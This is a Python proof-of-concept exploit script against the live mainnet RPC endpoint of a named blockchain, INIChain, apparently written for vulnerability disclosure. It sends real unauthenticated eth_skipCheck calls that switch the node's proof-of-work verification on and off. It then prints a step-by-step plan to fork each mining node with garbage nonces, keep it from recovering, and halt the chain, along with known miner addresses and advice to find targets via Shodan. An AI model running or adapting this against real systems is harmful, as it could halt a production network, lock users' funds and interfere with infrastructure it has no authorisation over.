#!/usr/bin/env python3
"""
PoC: F3 — eth_skipCheck Unauthenticated PoW Bypass
Target: INIChain Mainnet (Chain ID 7233)
RPC: https://rpc-mainnet.inichain.com

Vulnerability:
  eth_skipCheck(true) is exposed as Public RPC with no authentication.
  Sets noverify=true on the remoteSealer globally.
  With noverify=true, eth_submitWork accepts ANY nonce without PoW check.
  On a mining node, this causes:
    - Invalid block written to local chain as canonical
    - Invalid block broadcast to all peers (who reject it)
    - Mining node stuck on private fork until manual re-sync

Steps:
  1. Confirm eth_skipCheck is accessible with no auth
  2. Toggle state: true → false → true (prove full control)
  3. Confirm eth_getWork is also exposed (sealhash needed for full attack)
  4. Simulate full attack flow against a mining node (safe simulation)
  5. Show chain liveness attack logic (multi-miner targeting)
"""

import json
import subprocess
import sys
import time

PUBLIC_RPC = "https://rpc-mainnet.inichain.com"

# Known active mining nodes' coinbase addresses (from block scan)
KNOWN_MINERS = [
    "0x7c7bf4396d9fa35c5713cf1850f4e43914f23d49",   # group=1, mines ~20% of blocks
    "0xd843d47eae90ac076d4501208683aed8ec6f5b27",   # group=3000, authorized
    "0x989f0a0a37cc6938cf7d6124d8fb808f683d3a26",   # group=3000, authorized
    "0xfdd8e4d0819afa5d98b71b1e224b716a8f84c893",   # group=1, unauthorized
]


def rpc(endpoint, method, params, rid=1):
    payload = json.dumps({
        "jsonrpc": "2.0",
        "method": method,
        "params": params,
        "id": rid
    })
    cmd = ["curl", "-s", "-X", "POST", endpoint,
           "-H", "Content-Type: application/json",
           "-d", payload]
    out = subprocess.check_output(cmd, timeout=10)
    return json.loads(out)


def skip_check(endpoint, enabled: bool):
    res = rpc(endpoint, "eth_skipCheck", [enabled])
    if "error" in res:
        return None, res["error"]["message"]
    return res.get("result"), None


def get_work(endpoint):
    res = rpc(endpoint, "eth_getWork", [])
    if "error" in res:
        return None, res["error"]["message"]
    return res.get("result"), None


def submit_work(endpoint, nonce, extra_nonce, sealhash):
    res = rpc(endpoint, "eth_submitWork", [nonce, extra_nonce, sealhash])
    if "error" in res:
        return None, res["error"]["message"]
    return res.get("result"), None


def main():
    print("=" * 70)
    print("PoC: F3 — eth_skipCheck Unauthenticated PoW Verification Bypass")
    print(f"Target: {PUBLIC_RPC}")
    print("=" * 70)

    # Step 1: Confirm eth_skipCheck is accessible with no authentication
    print("\n[1] Testing eth_skipCheck accessibility (no auth)...")

    result, err = skip_check(PUBLIC_RPC, True)
    if err:
        print(f"  [!] eth_skipCheck(true) FAILED: {err}")
        sys.exit(1)
    elif result is True:
        print(f"  [+] eth_skipCheck(true)  → result={result}  ← SUCCESS, noverify=True set")
    else:
        print(f"  [?] Unexpected result: {result}")

    # Step 2: Toggle state to prove full control
    print("\n[2] Proving full attacker control over noverify state...")
    result, _ = skip_check(PUBLIC_RPC, False)
    print(f"  [+] eth_skipCheck(false) → result={result}  ← reset to False")

    result, _ = skip_check(PUBLIC_RPC, True)
    print(f"  [+] eth_skipCheck(true)  → result={result}  ← set back to True")

    result, _ = skip_check(PUBLIC_RPC, False)
    print(f"  [+] eth_skipCheck(false) → result={result}  ← reset to False (safe state)")
    print(f"  [+] State is fully controllable — no session, no token, no auth required")

    # Step 3: Confirm eth_getWork is exposed
    print("\n[3] Confirming eth_getWork is publicly accessible...")
    work, err = get_work(PUBLIC_RPC)
    if err and "no mining work" in err:
        print(f"  [+] eth_getWork accessible — public RPC not mining: '{err}'")
        print(f"  [i] On a mining node, this returns sealhash needed for eth_submitWork")
    elif work:
        print(f"  [+] eth_getWork returned work: {work}")

    # Step 4: Simulate full attack flow (safe — no real tx, no mining node targeted)
    print("\n[4] Simulating full attack flow on a hypothetical mining node...")
    print("""
  Attack sequence on a mining node with exposed RPC (e.g., port 8545):

  ATTACKER → mining_node_rpc:8545
  ─────────────────────────────────────────────────────────
  [A] eth_skipCheck(true)
      Response: {"result": true}
      Effect:   noverify = true (global, persists in memory)

  [B] eth_getWork()
      Response: {"result": ["0x<SEALHASH>", "0x<SEED>", "0x<TARGET>", "0x<NUM>"]}
      Effect:   attacker now has sealhash of pending block

  [C] eth_submitWork("0x0000000000000001", "0x0000000000000001", "0x<SEALHASH>")
      Response: {"result": true}   ← INVALID PoW accepted due to noverify=true
      Effect:
        1. submitWork() skips verifySeal() — garbage nonce accepted
        2. Invalid block sent to worker.resultCh
        3. worker.resultLoop() calls WriteBlockAndSetHead()
        4. Invalid block written to local LevelDB as CANONICAL
        5. w.mux.Post(NewMinedBlockEvent) — block broadcast to ALL peers
        6. All peers: VerifyHeader() → verifySeal() → REJECT
        7. Mining node is on PRIVATE FORK with invalid tip
        8. Mining node cannot produce accepted blocks until manual re-sync

  [D] Loop: eth_skipCheck(true) every 2 seconds
      Effect: Prevents recovery — node stays stuck even if admin tries to reset
""")

    # Step 5: Chain liveness attack
    print("[5] Chain liveness attack potential...")
    print(f"""
  Active mining nodes observed (from mainnet block scan):
""")
    for i, miner in enumerate(KNOWN_MINERS, 1):
        print(f"    {i}. {miner}")

    print(f"""
  Attack to halt INIChain block production:
    1. Discover mining node RPC endpoints (via devp2p discovery, Shodan port 8545/8546)
    2. For each mining node:
       a. Call eth_skipCheck(true) on target
       b. Call eth_getWork to get sealhash
       c. Call eth_submitWork with garbage nonce → node forks off chain
       d. Loop eth_skipCheck(true) every 2s to prevent recovery
    3. With all ~4 miners stuck on private forks:
       → No new blocks produced
       → INIChain is halted
       → User funds locked (cannot send transactions)
    4. Recovery requires manual operator intervention on each mining node

  Total attack cost: $0 (HTTP requests only)
  Time to execute: <60 seconds for all miners
""")

    # Final summary
    print("=" * 70)
    print("VULNERABILITY CONFIRMED:")
    print(f"  eth_skipCheck: Unauthenticated access on {PUBLIC_RPC}")
    print(f"  - Returns true (success) for any caller")
    print(f"  - Sets noverify=true globally on consensus engine")
    print(f"  - Enables invalid PoW acceptance via eth_submitWork")
    print(f"  - On mining nodes: causes fork from network, mining DoS")
    print(f"  - Chain-level: can halt all block production")
    print(f"  - SWC-105 / CWE-284 / CWE-400")
    print("=" * 70)


if __name__ == "__main__":
    main()
